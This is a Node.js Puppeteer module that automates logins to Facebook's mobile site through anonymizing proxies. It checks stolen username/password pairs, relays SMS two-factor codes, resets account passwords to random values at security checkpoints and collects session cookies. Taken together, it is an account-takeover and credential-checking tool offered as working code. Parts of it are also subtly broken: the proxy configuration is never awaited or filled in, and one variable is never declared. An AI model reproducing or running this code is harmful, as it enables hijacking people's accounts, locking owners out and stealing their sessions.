const puppeteer = require('puppeteer');
const proxyChain = require('proxy-chain');

let browser;
let page;
let checkSms;
let status;
async function initialize() {
    const proxyInfo = getConfigInfo();

    const launchOptions = {
        headless: "new"
    };

    if (proxyInfo.host && proxyInfo.port && proxyInfo.username && proxyInfo.password) {
        const proxyUrl = `http://${proxyInfo.username}:${proxyInfo.password}@${proxyInfo.host}:${proxyInfo.port}`;
        const newProxyUrl = await proxyChain.anonymizeProxy(proxyUrl);
        launchOptions.args = [
            `--proxy-server=${newProxyUrl}`,
            '--no-sandbox',
            '--disable-setuid-sandbox'
        ];
    }
    else if (proxyInfo.host && proxyInfo.port) {
        const proxyUrl = `http://${proxyInfo.host}:${proxyInfo.port}`;
        const newProxyUrl = await proxyChain.anonymizeProxy(proxyUrl);
        launchOptions.args = [
            `--proxy-server=${newProxyUrl}`,
            '--no-sandbox',
            '--disable-setuid-sandbox'
        ];
    }
    else {
        launchOptions.args = [
            '--no-sandbox',
            '--disable-setuid-sandbox'
        ];
    }

    browser = await puppeteer.launch(launchOptions);
    page = await browser.newPage();
}
async function getConfigInfo(ip, port, username, password) {
    const config = {
        host: ip,
        port: port,
        username: username,
        password: password
    };
    return config;
}
async function check(username, password) {
    let cookies;
    try {
        await page.goto('https://mbasic.facebook.com');
        await page.type('input[name="email"]', username);
        await page.type('input[name="pass"]', password);
        await page.click('input[type="submit"]');
        const loginError = await page.$('#login_error');
        if (loginError) {
            const text = await page.evaluate(() => {
                return {
                    status: 'WRONG'
                };
            });
            await browser.close();
            return {
                status: text
            };
        } else {
            if (await page.url().includes('checkpoint')) {
                const twoFactor = await page.$('#approvals_code');
                if (twoFactor) {
                    checkSms = await browser.newPage();
                    await checkSms.goto('https://mbasic.facebook.com/checkpoint/?having_trouble=1');
                    const smsEnable = await checkSms.$('input[type="radio"][value="sms_requested"]');
                    if (smsEnable) {
                        await checkSms.evaluate((element) => {
                            element.checked = true;
                        }, smsEnable);
                        await checkSms.click('input[type="submit"]');
                        await checkSms.close();
                        status = '2FA SMS'
                        return {
                            status
                        };
                    }
                    else {
                        await checkSms.close();
                        status = '2FA'
                        await page.goto('https://mbasic.facebook.com');
                        await page.type('input[name="email"]', username);
                        await page.type('input[name="pass"]', password);
                        await page.click('input[type="submit"]');
                        return {
                            status
                        };
                    }
                }
                else {
                    await browser.close();
                    return {
                        status: 'CHECKPOINT'
                    };
                }
            } else {
                await page.goto('https://mbasic.facebook.com')
                await page.goto('https://mbasic.facebook.com')
                const login_input = await page.$('input[name="email"]');
                if (login_input) {
                    await browser.close();
                    return {
                        status: 'WRONG'
                    };
                }
                cookies = (await page.cookies()).map(cookie => {
                    delete cookie.sameSite;
                    return cookie;
                });
                status = 'Không bật 2FA'
                return {
                    status,
                    cookies
                };
            }
        }
    } catch (error) {
        return 'Đã xảy ra lỗi ' + error;
    }
}
function generateRandomPassword(length) {
    const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+';
    let password = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * charset.length);
        password += charset[randomIndex];
    }
    return password;
}
async function enterCode(code) {
    let status;
    let cookies;
    await page.type('input[name="approvals_code"]', code);
    await page.click('input[type="submit"]');
    const wrongCode = await page.$('#approvals_code');
    if (wrongCode) {
        status = 'WRONGCODE';
        return status;
    }
    else {
        let currentUrl = page.url();
        let i = 0;
        while (i < 8) {
            if (currentUrl.includes('checkpoint')) {
                await page.click('input[type="submit"]');
                const newPassword = await page.$('input[name="password_new"]');
                if (newPassword) {
                    const randomPassword = generateRandomPassword(8);
                    await page.type('input[name="password_new"]', randomPassword);
                    await page.click('input[type="submit"]');
                    newpass = randomPassword;
                }
                currentUrl = await page.url();
            }
            else {
                cookies = (await page.cookies()).map(cookie => {
                    delete cookie.sameSite;
                    return cookie;
                });
                break;
            }
            i++;
        }
        if (i === 8) {
            await browser.close();
            status = 'CHECKPOINT';
            return { status };
        }
        return { status, cookies };
    }
}

async function close() {
    await browser.close();
}

module.exports = {
    initialize,
    getConfigInfo,
    check,
    enterCode,
    close
};
